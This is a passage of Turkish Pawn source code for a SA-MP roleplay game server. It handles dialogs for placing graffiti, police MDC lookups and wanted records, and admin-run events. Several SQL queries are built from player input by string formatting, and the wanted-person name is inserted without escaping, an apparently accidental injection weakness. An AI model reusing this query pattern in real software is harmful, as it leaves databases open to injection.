    		ShowPlayerDialog(playerid, DIALOG_GRAFFITI, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Graffiti", ""NOKTA" Graffiti\t "C2"Yazý\n"NOKTA" Graffiti\t "C2"Büyüklük\n"NOKTA" Graffiti\t "C2"Yazý Tipi\n"NOKTA" Graffiti\t "C2"Yazý Büyüklük\n"NOKTA" Graffiti\t "C2"Kalýnlýk\n"NOKTA" Graffiti\t "C2"Ortala\n"NOKTA" Graffiti\t "C2"Renk\n"NOKTA" Graffiti\t "C2"Konum Belirle\n"NOKTA" Graffiti\t "C2"Sil\n"NOKTA" Graffiti\t "C2"Kaydet(Tamamla)", "Tamam", "Iptal");
		}
		return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+7)
	{
	    if(response)
	    {
	        new mstring[128];
	        GetPVarString(playerid, "Yazi", mstring, 128);
	        new ytipi[255];
	        GetPVarString(playerid, "YaziTipi", ytipi, 255);
	        new Float:llX, Float:llY, Float:llZ, Float:llA;
	        GetPlayerPos(playerid, llX, llY, llZ);
	        GetPlayerFacingAngle(playerid, llA);
         	llX += (2 * floatsin(-llA, degrees));
    		llY += (2 * floatcos(-llA, degrees));
    		if(IsValidDynamicObject(graffiti[playerid])) DestroyDynamicObject(graffiti[playerid]);
            graffiti[playerid] = CreateDynamicObject(19482,llX,llY,llZ,0,0,0,.worldid=GetPlayerVirtualWorld(playerid),.interiorid=GetPlayerInterior(playerid));
			SetDynamicObjectMaterialText(graffiti[playerid], 0,mstring, GetPVarInt(playerid, "Buyukluk"), ytipi, GetPVarInt(playerid, "YaziBoyutu"), GetPVarInt(playerid, "Kalinlik"), GetPVarInt(playerid, "gRenk"), 0x00000000, GetPVarInt(playerid, "Ortalama"));
	    	EditDynamicObject(playerid, graffiti[playerid]);
	    	SetPVarInt(playerid, "GraffitiDuzenle", 1);
	    	Bilgi(playerid, "Graffitiyi düzenliyorsunuz.");
	    	Streamer_Update(playerid);
		}
		return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+8)
	{
	    if(response)
	    {

	        for(new i = 0;i < MAX_GATE;i++)
	        {
	        	if(IsPlayerNearDynamicObject(playerid, Graffitiler[i][gObje]))
	        	{
					if(Graffitiler[i][gYapan] == Karakter[playerid][sqlid]){
					    new SQLSorgusu[128];
					    Graffitiler[i][gPos][0] = 0;
					    Graffitiler[i][gPos][1] = 0;
					    Graffitiler[i][gPos][2] = 0;
					    DestroyDynamicObject(Graffitiler[i][gObje]);
					    format(SQLSorgusu, sizeof(SQLSorgusu), "DELETE FROM `graffitiler` WHERE `GraffitiID` = '%d'", i);
					    mysql_tquery(1, SQLSorgusu);
					    format(SQLSorgusu, sizeof(SQLSorgusu), "Graffitiyi sildiniz.", i);
					    Bilgi(playerid, SQLSorgusu);
					    format(SQLSorgusu, sizeof(SQLSorgusu), "[GRAFFITISIL] % idli graffitiyi sildi.", i);
					    Log(playerid, SQLSorgusu);
					    Streamer_Update(playerid);
					    return 1;
					}
	        	}
			}
			Hata(playerid, "Graffitinizin yanýnda deðilsiniz.");
		}
		return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+9)
	{
	    if(response)
	    {
	        if(IsValidDynamicObject(graffiti[playerid])) DestroyDynamicObject(graffiti[playerid]);
	        graffiti[playerid] = 0;
			new mstring2[64];
	 		GetPVarString(playerid, "Yazi", mstring2, 64);
    		new ytipi[128];
    		GetPVarString(playerid, "YaziTipi", ytipi, 128);
    		new query[128];
    		format(query, sizeof(query), "INSERT INTO `graffitiler` (`gX`, `gY`, `gZ`) VALUES ('%f', '%f', '%f')", GetPVarFloat(playerid, "gPosx"), GetPVarFloat(playerid, "gPosy"), GetPVarFloat(playerid, "gPosz"));
			new Cache:cache = mysql_query(query,true);
			new i = cache_insert_id();
			cache_delete(cache);
			Graffitiler[i][gID] = i;
			Graffitiler[i][gYapan] = Karakter[playerid][sqlid];
			Graffitiler[i][gPos][0] = GetPVarFloat(playerid, "gPosx");
			Graffitiler[i][gPos][1] = GetPVarFloat(playerid, "gPosy");
			Graffitiler[i][gPos][2] = GetPVarFloat(playerid, "gPosz");
			Graffitiler[i][gRot][0] = GetPVarFloat(playerid, "gRotx");
			Graffitiler[i][gRot][1] = GetPVarFloat(playerid, "gRoty");
			Graffitiler[i][gRot][2] = GetPVarFloat(playerid, "gRotz");
			format(Graffitiler[i][gYazi], 128, "%s", mstring2);
			format(Graffitiler[i][gFont], 128, "%s", ytipi);
			Graffitiler[i][gInt] = GetPlayerInterior(playerid);
			Graffitiler[i][gVW] = GetPlayerVirtualWorld(playerid);
			Graffitiler[i][gRenk] = GetPVarInt(playerid, "gRenk");
            Graffitiler[i][MateryalBoyut] = GetPVarInt(playerid, "Buyukluk");
            Graffitiler[i][FontBoyut] = GetPVarInt(playerid, "YaziBoyutu");
            Graffitiler[i][FontBold2] = GetPVarInt(playerid, "Kalinlik");
			Graffitiler[i][Ortala] = GetPVarInt(playerid, "Ortalama");
			GraffitiKaydet(i);
            Graffitiler[i][gObje] = CreateDynamicObject(19482,Graffitiler[i][gPos][0],Graffitiler[i][gPos][1],Graffitiler[i][gPos][2],Graffitiler[i][gRot][0],Graffitiler[i][gRot][1],Graffitiler[i][gRot][2],.worldid=Graffitiler[i][gVW],.interiorid=Graffitiler[i][gInt]);
			SetDynamicObjectMaterialText(Graffitiler[i][gObje], 0,Graffitiler[i][gYazi],Graffitiler[i][MateryalBoyut],Graffitiler[i][gFont],Graffitiler[i][FontBoyut],Graffitiler[i][FontBold2],Graffitiler[i][gRenk],0,Graffitiler[i][Ortala]);
			Bilgi(playerid, "Graffiti yapýldý!");
			Streamer_Update(playerid);
		}
	    return 1;
	}
	if(dialogid == DIALOG_GRAFFITI)
	{
	    if(response)
	    {
	    	if(listitem == 0)
	    	{
	        	ShowPlayerDialog(playerid, DIALOG_GRAFFITI+1, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Graffiti Yazý", ""C1"Maksimum 64 karakterlik yazýnýzý giriniz.", "Tamam", "Iptal");
			}
			if(listitem == 1)
			{
		    	ShowPlayerDialog(playerid, DIALOG_GRAFFITI+2, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Graffiti Büyüklük", ""C1"Graffitinin alan büyüklüðünü giriniz.\n"C3"(Boyutlarýn yanýnda belirtilen rakamlar, 0-13 arasý)\n32x32: 0\n64x32: 1\n64x64: 2\n128x32: 3\n128x64: 4\n128x128: 5\n256x32: 6\n256x64: 7\n256x128: 8\n256x256: 9\n512x64: 10\n512x128: 11\n512x256: 12\n512x512: 13", "Tamam", "Iptal");
			}
			if(listitem == 2)
			{
		    	ShowPlayerDialog(playerid, DIALOG_GRAFFITI+3, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Graffiti Yazý Tipi", ""C1"Standart yazý tipleri(Maksimum 32 Karakter)\n"C3"sistemin tanýtým konusunda desteklenen yazý tiplerini görebilirsiniz.\n(Bknz: Arial)", "Tamam", "Iptal");
			}
			if(listitem == 3)
			{
				ShowPlayerDialog(playerid, DIALOG_GRAFFITI+4, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Graffiti Yazý Büyüklüðü", ""C1"Yazý büyüklüðü(Font puntosu)'nü giriniz.\n"C3"(1 ile 255 arasý)", "Tamam", "Iptal");
			}
			if(listitem == 4)
			{
		    	ShowPlayerDialog(playerid, DIALOG_GRAFFITI+5, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Graffiti Yazý Kalýnlýðý", ""C1"Yazýnýn kalýnlýðýný belirtiniz.\n"C3"(0: Standart Font,1:Kalýnlaþtýr)", "Tamam", "Iptal");
			}
			if(listitem == 5)
			{
		    	ShowPlayerDialog(playerid, DIALOG_GRAFFITI+6, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Graffiti Yazý Ortala", ""C1"Standart obje açýsýna göre:\n"C3"0: Sola Daya\n1: Ortala\n2: Saða Daya.", "Tamam", "Iptal");
			}
			if(listitem == 6)
			{
		   		ShowPlayerDialog(playerid, DIALOG_GRAFFITI+11, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Graffiti Renk", ""C1"Grafitinin rengini girin:\n"C3"(#000000:Siyah - #FFFFFF:Beyaz)", "Tamam", "Iptal");
			}
			if(listitem == 7)
			{
		    	ShowPlayerDialog(playerid, DIALOG_GRAFFITI+7, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Graffiti Konum", ""C1"Graffiti konumunu düzenlemek istiyor musunuz ?\n"C4"Önemli Not: Graffitiniz yönetici onayý olmadan yerleþtirilmeyecektir,\neðer graffiti konumunu rol akýþýný engelleyecek - gerçek dýþý yerleþtirirseniz\nhakkýnýzda gerekli iþlem yapýlacaktýr!", "Tamam", "Iptal");
			}
			if(listitem == 8)
			{
		    	ShowPlayerDialog(playerid, DIALOG_GRAFFITI+8, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Graffiti Sil", ""C1"Graffitiyi gerçekten silmek istiyor musunuz ?\n"C4"Önemli Not: Bu iþlem geri alýnamaz!", "Tamam", "Iptal");
			}
			if(listitem == 9)
			{
		   		ShowPlayerDialog(playerid, DIALOG_GRAFFITI+9, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Graffiti Kaydet", ""C1"Grafitiyi gerçekten kaydetmek istiyor musunuz ?\n"C4"Önemli Not: Kaydettikten sonra graffitiniz yönetici tarafýndan onaylanana kadar graffiti üzerinde hiçbir düzenleme yapamazsýnýz!", "Tamam", "Iptal");
			}
		}
		return 1;
	}
	if(dialogid == 394)
	{
	    if(response)
	    {
	        switch(GetPVarInt(playerid, "MDCTip"))
	        {
	            case 1:
	            {
					MDCOyuncuGoster(playerid, inputtext);
					SetPVarString(playerid, "MDCOyuncuIsim", inputtext);
	            }
	            case 2:
	            {
	                new _id = strval(inputtext);
	                if(Ev[_id][girisX] == 0 && Ev[_id][girisY] == 0 && Ev[_id][girisZ] == 0) return Hata(playerid, "Bu idli ev bulunmamaktadýr.");
	                for(new i=0;i<55;i++)
					{
					    if(i == 0 || 4 <= i <= 7 || i == 16 || 18 <= i <= 23 || i == 25 || i == 26) continue;
					    PlayerTextDrawHide(playerid, PDMDC[playerid][i]);
					}
					new mstring[150];
					format(mstring, sizeof(mstring), "Ev_Adres:_%s_%d",GetLocation(Ev[_id][girisX],Ev[_id][girisY],Ev[_id][girisZ]),_id);
					PlayerTextDrawSetString(playerid, PDMDC[playerid][40], mstring);
					format(mstring, sizeof(mstring), "Ev_Sahibi:_%s",SQLFromName(Ev[_id][esahip]));
					PlayerTextDrawSetString(playerid, PDMDC[playerid][41], mstring);
					if(Isyeri[_id][kira] == 1 && Isyeri[_id][kiralayan] != -1) {
                    format(mstring, sizeof(mstring), "Ev_Kiracisi:_%s",SQLFromName(Ev[_id][kiralayan]));
					PlayerTextDrawSetString(playerid, PDMDC[playerid][42], mstring);
					}
					PlayerTextDrawSetString(playerid, PDMDC[playerid][43], "Ev_Bilgileri");
					for(new i=40;i<44;i++) {
					if(Ev[_id][kiralayan] == -1 && i == 42) continue;
					PlayerTextDrawShow(playerid, PDMDC[playerid][i]);
					}
	            }
	            case 3:
	            {
	                new _id = strval(inputtext);
	                if(!IsValidDynamicPickup(Isyeri[_id][ipickupid])) return Hata(playerid, "Bu idli iþyeri bulunmamaktadýr.");
	                for(new i=0;i<55;i++)
					{
					    if(i == 0 || 4 <= i <= 7 || i == 16 || 18 <= i <= 23 || i == 25 || i == 26) continue;
					    PlayerTextDrawHide(playerid, PDMDC[playerid][i]);
					}
					new mstring[150];
					format(mstring, sizeof(mstring), "Isyeri_Adres:_%s_%d",GetLocation(Isyeri[_id][girisX],Isyeri[_id][girisY],Isyeri[_id][girisZ]),_id);
					PlayerTextDrawSetString(playerid, PDMDC[playerid][40], mstring);
					format(mstring, sizeof(mstring), "Isyeri_Sahibi:_%s",SQLFromName(Isyeri[_id][isahip]));
					PlayerTextDrawSetString(playerid, PDMDC[playerid][41], mstring);
					if(Isyeri[_id][kira] == 1 && Isyeri[_id][kiralayan] != -1) {
                    format(mstring, sizeof(mstring), "Isyeri_Kiracisi:_%s",SQLFromName(Isyeri[_id][kiralayan]));
					PlayerTextDrawSetString(playerid, PDMDC[playerid][42], mstring);
					}
					PlayerTextDrawSetString(playerid, PDMDC[playerid][43], "Isyeri_Bilgileri");
					for(new i=40;i<44;i++) {
					if(Isyeri[_id][kiralayan] == -1 && i == 42) continue;
					PlayerTextDrawShow(playerid, PDMDC[playerid][i]);
					}
	            }
	            case 4:
	            {
	                new _id=-1,xstring1[32],xstring2[32];
	                format(xstring2, 32, "%s", inputtext);
	                strreplace(xstring2, " ", "");
	                for(new ix=0;ix<MAX_VEHICLES;ix++)
					{
					    if(!IsValidVehicle(ix)) continue;
					    format(xstring1, 32, "%s", Arac[ix][aplaka]);
					    strreplace(xstring1, " ", "");
					    if(Buysa(xstring1,xstring2))
					    {
					        _id = ix;
					        break;
						}
					}
					if(_id == -1) return Hata(playerid, "Bu plakalý araç bulunmamaktadýr.");
	            	for(new i=0;i<55;i++)
					{
					    if(i == 0 || 4 <= i <= 7 || i == 16 || 18 <= i <= 23 || i == 25 || i == 26) continue;
					    PlayerTextDrawHide(playerid, PDMDC[playerid][i]);
					}
					new mstring[256];
					new ctext[6];
					ctext = "Hayir";
					if(cezali[_id] > 0) ctext = "Evet";
					format(mstring, sizeof(mstring), "Cezali:%s________________-_______Ceza:$%d",ctext,cezali[_id]);
					PlayerTextDrawSetString(playerid, PDMDC[playerid][45], mstring);
					format(mstring, sizeof(mstring), "Sahibi:%s____-______Vergi:$%d",SQLFromName(Arac[_id][aowner]),Arac[_id][vergi]);
					PlayerTextDrawSetString(playerid, PDMDC[playerid][46], mstring);
					PlayerTextDrawSetPreviewModel(playerid, PDMDC[playerid][47], GetVehicleModel(_id));
					format(mstring, sizeof(mstring), "Model:%s_______-______Plaka:%s",VehicleName[GetVehicleModel(_id)-400][0],Arac[_id][aplaka]);
					PlayerTextDrawSetString(playerid, PDMDC[playerid][48], mstring);
					for(new i=45;i<49;i++) {
					PlayerTextDrawShow(playerid, PDMDC[playerid][i]);
					}
	            }
			}
	    }
	    return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+11)
	{
	    if(response)
	    {
     		if(strlen(inputtext) < 1 || strlen(inputtext) > 100) return Hata(playerid, "Hatalý renk girdiniz.");
	    	SetPVarInt(playerid, "gRenk", HexToInteger(inputtext));
			Bilgi(playerid,"Graffiti rengini deðiþtirdiniz.");
			ShowPlayerDialog(playerid, DIALOG_GRAFFITI, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Graffiti", ""NOKTA" Graffiti\t "C2"Yazý\n"NOKTA" Graffiti\t "C2"Büyüklük\n"NOKTA" Graffiti\t "C2"Yazý Tipi\n"NOKTA" Graffiti\t "C2"Yazý Büyüklük\n"NOKTA" Graffiti\t "C2"Kalýnlýk\n"NOKTA" Graffiti\t "C2"Ortala\n"NOKTA" Graffiti\t "C2"Renk\n"NOKTA" Graffiti\t "C2"Konum Belirle\n"NOKTA" Graffiti\t "C2"Sil\n"NOKTA" Graffiti\t "C2"Kaydet(Tamamla)", "Tamam", "Iptal");
		}
		return 1;
	}
 	if(dialogid == 396)
	{
	    if(response)
	    {
	        if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
	        if(listitem == 0)
			{
			    new _durum[20];
			    new mstring[2048],_tip[16];
			    for(new i=1;i<MAX_MDCARANMA;i++)
				{
			    	if(MDCAranma[i][MDCTip] != 0 && !isnull(MDCAranma[i][MDCSuc]) && !isnull(MDCAranma[i][MDCAranan]))
			    	{
			    	    if(MDCAranma[i][MDCTip] == 1) _tip = "Araç";
			    	    if(MDCAranma[i][MDCTip] == 2) _tip = "Kiþi";
			    	    if(IsPlayerConnected(GetPlayerIdFromName(MDCAranma[i][MDCAranan]))) _durum = "{33aa33}Online";
						else if(!IsPlayerConnected(GetPlayerIdFromName(MDCAranma[i][MDCAranan]))) _durum = "{900000}Offline";
			    	    format(mstring, sizeof(mstring), "%s\n%s\t%s\t%s",mstring,_tip,MDCAranma[i][MDCAranan],_durum);
			    	}
				}
				format(mstring, sizeof(mstring), "Aranan\tÝsim/Plaka\tDurum\n%s",mstring);
	        	ShowPlayerDialog(playerid, 400, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"LSPD - MDC", mstring, "Seç", "Ýptal");
	        }
	        if(listitem == 1) ShowPlayerDialog(playerid, 397, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"LSPD - MDC", "Araç Aranma Ekle\nKiþi Aranma Ekle", "Seç", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 397)
	{
	    if(response)
	    {
	        if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
			SetPVarInt(playerid, "MDCAranmaTip", listitem+1);
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, 398, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"LSPD - MDC", ""C1"Aracýn plakasýný girin:", "Gir", "Ýptal");
				case 1: ShowPlayerDialog(playerid, 398, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"LSPD - MDC", ""C1"Oyuncunun adýný girin:", "Gir", "Ýptal");
			}
	    }
		return 1;
	}
	if(dialogid == 398)
	{
		if(response)
		{
		    if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
		    SetPVarString(playerid, "MDCAranmaAranan", inputtext);
	     	switch(GetPVarInt(playerid, "MDCAranmaTip"))
			{
			    case 1: ShowPlayerDialog(playerid, 399, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"LSPD - MDC", ""C1"Aracý detaylý olarak açýklayýn ve suçunu girin:", "Gir", "Ýptal");
				case 2: ShowPlayerDialog(playerid, 399, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"LSPD - MDC", ""C1"Kiþiyi detaylý olarak açýklayýn ve suçunu girin:", "Gir", "Ýptal");
			}
		}
	    return 1;
	}
	if(dialogid == 399)
	{
	    if(response)
	    {
	        if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
	        SetPVarString(playerid, "MDCAranmaSuc", inputtext);
	        new _id, query2[256];
			for(new i=1;i<MAX_MDCARANMA;i++)
			{
			    if(MDCAranma[i][MDCTip] == 0 && isnull(MDCAranma[i][MDCSuc]) && isnull(MDCAranma[i][MDCAranan]))
			    {
			        _id=i;
			        break;
			    }
			}
			MDCAranma[_id][MDCTip] = GetPVarInt(playerid, "MDCAranmaTip");
			GetPVarString(playerid, "MDCAranmaAranan", MDCAranma[_id][MDCAranan], 128);
			GetPVarString(playerid, "MDCAranmaSuc", MDCAranma[_id][MDCSuc], 256);
			format(MDCAranma[_id][MDCMemur], MAX_PLAYER_NAME+1, "%s", OyuncuAdiniBul(playerid));
			format(query2,sizeof(query2),"{ffff00}[LSPD] %s, bir aranma kaydý oluþturdu.",OyuncuAdiniBul(playerid));
			for(new i=0;i<MAX_PLAYERS;i++){
			if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
			MesajGonder(i,0xAAAAFFFF,query2);
			}
			}
			new mtext[20];
			new year, month,day;
			getdate(year, month, day);
			if(month == 1) { mtext = "Ocak"; }
			else if(month == 2) { mtext = "Subat"; }
			else if(month == 3) { mtext = "Mart"; }
			else if(month == 4) { mtext = "Nisan"; }
			else if(month == 5) { mtext = "Mayis"; }
			else if(month == 6) { mtext = "Haziran"; }
			else if(month == 7) { mtext = "Temmuz"; }
			else if(month == 8) { mtext = "Agustos"; }
			else if(month == 9) { mtext = "Eylul"; }
			else if(month == 10) { mtext = "Ekim"; }
			else if(month == 11) { mtext = "Kasim"; }
			else if(month == 12) { mtext = "Aralik"; }
			new hour,minuite,second;
			gettime(hour,minuite,second);
			#pragma unused second
			format(MDCAranma[_id][MDCTarih], 256, "Tarih:[%d %s %d] - Saat:[%d:%d]", day,mtext,year,hour,minuite);
			new query[2048];
			new __string[256];
			format(__string, 256, "%s", EscapeString(MDCAranma[_id][MDCSuc]));
			format(query, sizeof(query), "INSERT INTO `aranmakayit` (`id`,`Aranan`,`Memur`,`Suc`,`Tip`,`Tarih`) VALUES ('%d','%s','%s','%s','%d','%s')",
			_id,
			MDCAranma[_id][MDCAranan],
			MDCAranma[_id][MDCMemur],
			__string,
			MDCAranma[_id][MDCTip],
			MDCAranma[_id][MDCTarih]);
			mysql_tquery(1,query);
	    }
	    return 1;
	}
	if(dialogid == 400)
	{
	    if(response)
	    {
	        if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
	        new _say=-1,mstring[2048],_tip[16];
	        for(new i=1;i<MAX_MDCARANMA;i++)
			{
		    	if(MDCAranma[i][MDCTip] != 0 && !isnull(MDCAranma[i][MDCSuc]) && !isnull(MDCAranma[i][MDCAranan]))
		    	{
		    	    _say++;
		    	    if(listitem == _say)
		    	    {
		    	        if(MDCAranma[i][MDCTip] == 1) _tip = "Araç";
		    	        if(MDCAranma[i][MDCTip] == 2) _tip = "Kiþi";
		    	        format(mstring, sizeof(mstring), ""C1""NOKTA" Tip:\t\t "C2"%s\n"C1""NOKTA" Aranan:\t "C2"%s\n"C1""NOKTA" Suç:\t\t "C2"%s\n"C1""NOKTA" Memur:\t "C2"%s\n"C1""NOKTA" Tarih:\t "C2"%s",_tip,MDCAranma[i][MDCAranan],MDCAranma[i][MDCSuc],MDCAranma[i][MDCMemur],MDCAranma[i][MDCTarih]);
						SetPVarInt(playerid, "AranmaSil", i);
						break;
					}
				}
			}
			ShowPlayerDialog(playerid, 404, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"LSPD - MDC", mstring, "Geri", "Aranma Sil");
		}
	    return 1;
	}
	if(dialogid == 404)
	{
	    if(response)
	    {
	        if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
	        new mstring[2048],_tip[16],_durum[20];
	    	for(new i=1;i<MAX_MDCARANMA;i++)
			{
			   	if(MDCAranma[i][MDCTip] != 0 && !isnull(MDCAranma[i][MDCSuc]) && !isnull(MDCAranma[i][MDCAranan]))
			   	{
			   	    if(MDCAranma[i][MDCTip] == 1) _tip = "Araç";
			   	    else if(MDCAranma[i][MDCTip] == 2) _tip = "Kiþi";
					if(IsPlayerConnected(GetPlayerIdFromName(MDCAranma[i][MDCAranan]))) _durum = "{33aa33}Online";
					else if(!IsPlayerConnected(GetPlayerIdFromName(MDCAranma[i][MDCAranan]))) _durum = "{900000}Offline";
            		format(mstring, sizeof(mstring), "%s\n%s\t%s\t%s",mstring,_tip,MDCAranma[i][MDCAranan],_durum);
			   	}
			}
			format(mstring, sizeof(mstring), "Aranan\tÝsim/Plaka\tDurum\n%s",mstring);
	       	ShowPlayerDialog(playerid, 400, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"LSPD - MDC", mstring, "Seç", "Ýptal");
	    }
		else
	    {
	        new _id = GetPVarInt(playerid, "AranmaSil");
	        if(!Buysa(OyuncuAdiniBul(playerid), MDCAranma[_id][MDCMemur]) && Karakter[playerid][rutbe] > 16) return Hata(playerid, "Bu aranma kaydýný silemezsiniz.");
	        MDCAranma[_id][MDCTip] = 0;
	        format(MDCAranma[_id][MDCAranan], 128, "");
	        format(MDCAranma[_id][MDCSuc], 256, "");
	        format(MDCAranma[_id][MDCMemur], MAX_PLAYER_NAME+1, "");
	        format(MDCAranma[_id][MDCTarih], 256, "");
	        Bilgi(playerid, "Aranma kaydý silindi.");
	        new query[128];
	        format(query, sizeof(query), "DELETE FROM `aranmakayit` WHERE `id` = '%d'",_id);
	        mysql_tquery(1,query);
	    }
	    return 1;
	}
	if(dialogid == 405)
	{
			if(response)
		    {
			    switch(listitem)
		        {
		            case 0:
					{
						ShowPlayerDialog(playerid,412,DIALOG_STYLE_LIST,"Event Ayarlarý","Silah 1\nSilah 2\nSilah 3","Seç","Geri");
				 	} // Event Ayarlarý
		            case 1:
					{
						ShowPlayerDialog(playerid,406,DIALOG_STYLE_INPUT,"Event Ayarlarý","Oyuncularýn canýný girin:","Seç","Geri");
					} // Event Player's Health
		            case 2:
					{
						ShowPlayerDialog(playerid,407,DIALOG_STYLE_INPUT,"Event Ayarlarý","Oyuncularýn armorunu girin:","Seç","Geri");
					} // Event Player's Armour
		            case 3:
					{
						ShowPlayerDialog(playerid,408,DIALOG_STYLE_INPUT,"Event Ayarlarý","Oyunculara verilcek araç idsini girin:","Seç","Geri");
					} // Event Vehicles
		            case 4:
					{
						GetPlayerPos(playerid, xx,yy,zz);
					} // Event Position (Sets the positon you are standing on)
		            case 5:
					{
						ShowPlayerDialog(playerid,409,DIALOG_STYLE_INPUT,"Event Ayarlarý","Evente Giriþleri Kilitle? (Evet = 1/Hayýr = 0)","Seç","Geri");
					} // Event-Locked
		            case 6:
					{
						ShowPlayerDialog(playerid,410,DIALOG_STYLE_INPUT,"Event Ayarlarý","Eventi Baþlat? (Evet = 1/Hayýr = 0)","Seç","Geri");
					} // Start Event
		            case 7:
					{
						ShowPlayerDialog(playerid,411,DIALOG_STYLE_INPUT,"Event Ayarlarý","Eventi Duyur (Evet = 1/Hayýr = 0)","Seç","Geri");
					} // Announce Event
					case 8:// Get Event Players
					{
						if(elock == 1 && alreadydone == 0)
						{
							for(new i;i<MAX_PLAYERS;i++) if(join[i] == 1 && i != INVALID_PLAYER_ID)
				        	{
				        	    ResetPlayerWeapons(i);
				        	    SetPlayerPos(i,xx,yy,zz);
				        	    SetPlayerHealth(i,ehealth);
				        	    SetPlayerArmour(i,earmour);
				        	    GivePlayerWeapon(i,eweaps[0],9999);
				        	    GivePlayerWeapon(i,eweaps[1],9999);
				        	    GivePlayerWeapon(i,eweaps[2],9999);
				        	    SetTimerEx("GiveVehicle2",1000,false,"i",i);
				        	    if(efreeze == 1)
				        	    {
				        	    	TogglePlayerControllable(i,0);
				        	    }
				        	}
						}
						else if(alreadydone == 1)
						{
						    Hata(playerid,"Oyuncular teleport edildi.!");
						}
					}
					case 9: //Finish Event
					{
					    for(new i;i<MAX_PLAYERS;i++) if(join[i] == 1)
					    {
					        join[i] = 0;
					        DONDUR(i);
					        SetPlayerPos(i, GetPVarFloat(i,"ePosX"), GetPVarFloat(i,"ePosY"), GetPVarFloat(i,"ePosZ"));
					        SetPlayerFacingAngle(i,GetPVarFloat(i,"ePosAngle"));
					        SetPlayerInterior(i, GetPVarInt(i, "ePosInt"));
					        SetPlayerVirtualWorld(i, GetPVarInt(i, "ePosVw"));
							UnfreezeTimerVar[i] = SetTimerEx("UnfreezeTimer", 3500, false, "u", i);
					        //SpawnPlayer(i);
					    }
					    for(new i=0;i<=3;i++)
					    {
							TextDrawHideForAll(eventText[i]);
						}
						eweaps[0] = 0;
						eweaps[1] = 0;
						eweaps[2] = 0;
						ehealth = 0;
						earmour = 0;
						eveh = 0;
						xx = 0.00000;
						yy = 0.00000;
						zz = 0.00000;
						elock = 0;
						estart = 0;
						eannounce = 0;
						efreeze = 0;
					}
					case 10: //Should player's freeze?
					{
						ShowPlayerDialog(playerid,417,DIALOG_STYLE_INPUT,"Oyuncu Dondur","Teleporttan sonra oyuncular donsun mu? (1 = Evet/ 0 = Hayýr)","Seç","Geri");
					}
		        }
		    }
			return 1;
		}
    if(dialogid == 406)
	    {
	        if(response)
	        {
	        	ehealth = strval(inputtext);
	        }
	        return 1;
	}
 	if(dialogid == 407)
	{
	        if(response)
	        {
	        	earmour = strval(inputtext);
	        }
	        return 1;
	}
	if(dialogid == 408)
	{
	        if(response)
	        {
	        	eveh = strval(inputtext);
	        }
	        return 1;
	}
 	if(dialogid == 409)
  	{
	        if(response)
	        {
		        if(estart == 1)
		        {
		        	elock = strval(inputtext);
		        	if(elock == 1) SendClientMessageToAll(COLOR_YELLOW,"[EVENT] "C1"Evente giriþler kapatýldý.");
		        	if(elock == 0) SendClientMessageToAll(COLOR_YELLOW,"[EVENT] "C1"Evente giriþler açýldý.");
		        }
		        else
		        {
		            Hata(playerid,"Önce event duyurulmalý.");
	             	ShowPlayerDialog(playerid,409,DIALOG_STYLE_INPUT,"Event Ayarlarý","Eventi Kilitle? (Evet/Hayýr)","Seç","Geri");
		        }
	        }
	        return 1;
	}
	if(dialogid == 410)
	{
	        if(response)
	        {
	        	if(eannounce == 1 && elock == 0)
		        {
		        	estart = strval(inputtext);
		        	SendClientMessageToAll(COLOR_YELLOW,"[EVENT] "C1"Event baþlatýldý, event duyuru kutusundan detaylý bilgiyi görebilirsiniz.");
		        }
		        else
		        {
		        	Hata(playerid,"Önce event duyurulmalý.");
		        }
	        }
	        return 1;
	}
	if(dialogid == 411)
	{
	    if(response)
 		{
	    	ShowPlayerDialog(playerid,416,DIALOG_STYLE_INPUT,"Event Duyuru","Duyurulcak Anonsu Girin:","Seç","Geri");
 		}
        return 1;
	}
	if(dialogid == 412)
	{
	        if(response)
	        {
	            if(isnull(inputtext))
	            {
	            	ShowPlayerDialog(playerid,412,DIALOG_STYLE_LIST,"Event Ayarlarý","Silah 1\nSilah 2\nSilah 3","Seç","Geri");
	            }
				switch(listitem)
				{
				    case 0:
				    {
						ShowPlayerDialog(playerid,413,DIALOG_STYLE_INPUT,"Event Silah 1","1. Silah Ýçin SilahID Girin:","Seç","Geri");
				    }
				    case 1:
				    {
